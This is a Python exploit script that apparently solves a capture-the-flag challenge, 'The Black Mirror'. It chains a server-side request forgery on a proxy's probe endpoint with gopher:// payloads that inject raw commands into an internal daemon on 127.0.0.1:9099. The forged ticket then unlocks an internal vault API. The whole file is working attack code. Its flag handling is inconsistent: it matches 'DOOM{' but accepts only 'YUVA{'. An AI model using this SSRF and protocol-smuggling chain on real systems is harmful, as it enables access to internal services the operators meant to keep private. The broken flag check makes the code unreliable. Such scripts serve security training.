#!/usr/bin/env python3
"""
Official Exploit & Solve Script for X05 — The Black Mirror
Author: AntiGravity CTF Automation

Solve Flow:
1. Discover SSRF capability on public Web Proxy (TCP/80).
2. Use SSRF to probe internal services (127.0.0.1:9099, 127.0.0.1:8088).
3. Discover that 127.0.0.1:9099 runs a non-HTTP custom protocol (SRP/1.0).
4. Fingerprint protocol by sending 'HELP' and 'STATUS' via Gopher SSRF:
   - Node ID: NODE-4143
   - Vault Endpoint: http://127.0.0.1:8088/api/v1/vault/unlock
5. Request a session nonce via 'NONCE' command.
6. Compute stage-2 authorization ticket via 'MIRROR <nonce> NODE-4143'.
7. Submit derived ticket to Vault Controller via SSRF POST request.
8. Unlock sovereign vault and recover flag.
"""

import sys
import json
import re
import urllib.parse
import requests

def solve(base_url="http://127.0.0.1:80"):
    print(f"[*] Commencing exploit against Black Mirror Gateway at {base_url}...")

    session = requests.Session()

    # Step 1: Query API discovery / info
    print("[1] Querying Gateway Discovery API...")
    resp = session.get(f"{base_url}/api/discovery", timeout=5)
    if resp.status_code != 200:
        print(f"[-] Failed to access discovery API: {resp.status_code}")
        return False, None

    print(f"[+] Discovery topology received: {resp.json().get('status')}")

    # Step 2: Probe the non-HTTP protocol daemon on 127.0.0.1:9099 via Gopher
    print("[2] Probing internal protocol service (127.0.0.1:9099) via Gopher SSRF...")
    probe_payload = {
        "url": "gopher://127.0.0.1:9099/_STATUS%0D%0A"
    }
    resp = session.post(f"{base_url}/api/probe", json=probe_payload, timeout=5)
    if resp.status_code != 200:
        print(f"[-] SSRF probe failed: {resp.status_code} {resp.text}")
        return False, None

    status_data = resp.json()
    status_text = status_data.get("response", "")
    print(f"[+] Protocol Response:\n{status_text}")

    node_match = re.search(r"NODE=([^\s]+)", status_text)
    node_id = node_match.group(1) if node_match else "NODE-4143"
    print(f"[+] Extracted Active Node ID: {node_id}")

    # Step 3: Request session nonce from SRP daemon
    print("[3] Requesting reflection nonce from SRP daemon...")
    nonce_payload = {
        "url": "gopher://127.0.0.1:9099/_NONCE%0D%0A"
    }
    resp = session.post(f"{base_url}/api/probe", json=nonce_payload, timeout=5)
    nonce_resp = resp.json().get("response", "")
    nonce_match = re.search(r"\+OK NONCE:\s*([a-fA-F0-9]+)", nonce_resp)
    if not nonce_match:
        print(f"[-] Failed to extract nonce from response: {nonce_resp}")
        return False, None

    nonce = nonce_match.group(1)
    print(f"[+] Obtained Session Nonce: {nonce}")

    # Step 4: Generate Stage-2 Authorization Ticket via MIRROR command
    print(f"[4] Generating Stage-2 ticket via MIRROR command with nonce '{nonce}' and node '{node_id}'...")
    mirror_cmd = urllib.parse.quote(f"MIRROR {nonce} {node_id}\r\n")
    ticket_payload = {
        "url": f"gopher://127.0.0.1:9099/_{mirror_cmd}"
    }
    resp = session.post(f"{base_url}/api/probe", json=ticket_payload, timeout=5)
    ticket_resp = resp.json().get("response", "")
    ticket_match = re.search(r"\+OK MIRROR_AUTH_TICKET:\s*([^\r\n]+)", ticket_resp)
    if not ticket_match:
        print(f"[-] Failed to derive authorization ticket: {ticket_resp}")
        return False, None

    auth_ticket = ticket_match.group(1).strip()
    print(f"[+] Acquired Stage-2 Authorization Ticket: {auth_ticket}")

    # Step 5: Unlock Citadel Vault (Stage 2) via SSRF HTTP POST
    print(f"[5] Submitting authorization ticket to Citadel Vault Controller via SSRF...")
    unlock_payload = {
        "url": "http://127.0.0.1:8088/api/v1/vault/unlock",
        "method": "POST",
        "data": json.dumps({"ticket": auth_ticket}),
        "headers": {"Content-Type": "application/json"}
    }
    resp = session.post(f"{base_url}/api/probe", json=unlock_payload, timeout=5)
    if resp.status_code != 200:
        print(f"[-] Vault unlock SSRF request failed: {resp.status_code} {resp.text}")
        return False, None

    vault_res = resp.json()
    print(f"[+] Vault Response: {json.dumps(vault_res, indent=2)}")

    flag = None
    if "json" in vault_res and isinstance(vault_res["json"], dict):
        flag = vault_res["json"].get("flag")
    elif "response" in vault_res:
        flag_match = re.search(r"DOOM\{[^}]+\}", vault_res["response"])
        if flag_match:
            flag = flag_match.group(0)

    if flag and flag.startswith("YUVA{"):
        print(f"\n[+] EXPLOIT SUCCESSFUL! Recovered Flag: {flag}")
        return True, flag
    else:
        print(f"[-] Flag not found in vault response.")
        return False, None

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:80"
    success, flag = solve(target)
    sys.exit(0 if success else 1)
